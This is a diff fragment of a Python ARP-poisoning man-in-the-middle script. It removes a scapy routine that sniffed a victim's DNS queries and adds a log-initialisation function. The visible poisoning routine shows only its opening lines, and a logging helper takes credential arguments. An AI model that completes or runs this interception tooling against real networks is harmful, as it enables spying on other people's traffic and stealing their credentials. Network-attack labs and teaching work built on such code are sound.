@@ -95,39 +95,28 @@ def log_packet(message, payload=None, credential=None, body=None):
         print(f"[ERROR] Could not write to log file: {e}")
 
 
-def sniff_outgoing_packets(victim_ip):
-    """Sniff packets from victim and log them to file"""  
-    # Initialize log file
+def initialize_packet_log(victim_ip=None):
+    """Initialize the packet log file with a header banner"""
     try:
+        os.makedirs(os.path.dirname(PACKET_LOG_FILE), exist_ok=True)
         with open(PACKET_LOG_FILE, "a") as f:
             timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
             f.write(f"\n{'='*60}\n")
-            f.write(f"[{timestamp}] Packet capture started for {victim_ip}\n")
+            header = f"[{timestamp}] Packet log initialized"
+            if victim_ip:
+                header += f" for {victim_ip}"
+            f.write(header + "\n")
             f.write(f"{'='*60}\n")
-
+        print(f"+ Logging to: {PACKET_LOG_FILE}")
     except Exception as e:
         print(f"[ERROR] Could not initialize log file: {e}")
-    
-    def packet_callback(packet):
-        """"Handle DNS, HTTP, HTTPS packets"""
-        # Check for DNS queries from victim
-        if packet.haslayer(scapy.DNSQR):
-            dns_query = packet[scapy.DNSQR]
-            log_packet(f"[DNS] {victim_ip} -> {dns_query.qname.decode()}")
-        
-    print(f"+ Sniffing packets from {victim_ip}")
-    print(f"+ Logging to: {PACKET_LOG_FILE}")
-
-    # Start sniffing and call function on every packet recieved
-    scapy.sniff(prn=packet_callback, filter=f"ip src {victim_ip}", store=0, iface=INTERFACE)
 
 
 # ARP Poisoning Attack
 def run_arp_poisoning(victim):
     """Run ARP poisoning attack"""
-    # Start sniffing thread
-    sniff_thread = threading.Thread(target=sniff_outgoing_packets, args=(victim,), daemon=True)
-    sniff_thread.start()
+    # Initialize log file 
+    initialize_packet_log(victim)
 
     # Start ARP poisoning
     print(f"+ Starting ARP poisoning: {WEB_SERVER_IP} <-> {victim} <-> {DNS_SERVER_IP}")
